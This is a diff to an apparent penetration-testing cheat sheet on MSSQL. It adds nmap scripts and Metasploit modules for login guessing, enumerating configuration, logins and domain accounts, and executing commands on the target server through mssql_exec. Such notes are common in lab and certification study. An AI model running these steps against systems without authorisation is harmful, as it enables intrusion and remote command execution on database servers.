@@ -620,25 +620,34 @@ nmap [ip] -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin
 ```
 nmap [ip]
 
-nmap [ip] -p 1433 -sV
+nmap [ip] -p 1433 -sV --script ms-sql-info
+
+msfconsole - use auxiliary/scanner/mssql/mssql_login
 ```
 
 -   Enumerate MSSQL configuration
 ```
-
+msfconsole - use auxiliary/scanner/mssql/mssql_enum
 ```
 
 -   Enumerate all MSSQL logins
 ```
-
+msfconsole - use auxiliary/scanner/mssql/mssql_enum_sql_logins
 ```
 
 -   Execute a command on the target machine
 ```
+msfconsole - use auxiliary/scanner/mssql/mssql_exec
 
+set cmd whoami
+
+run
 ```
 
 -   Enumerate all available system users
 ```
-
+msfconsole - use auxiliary/scanner/mssql/mssql_enum_domain_accounts
 ```
+
+---
+# 
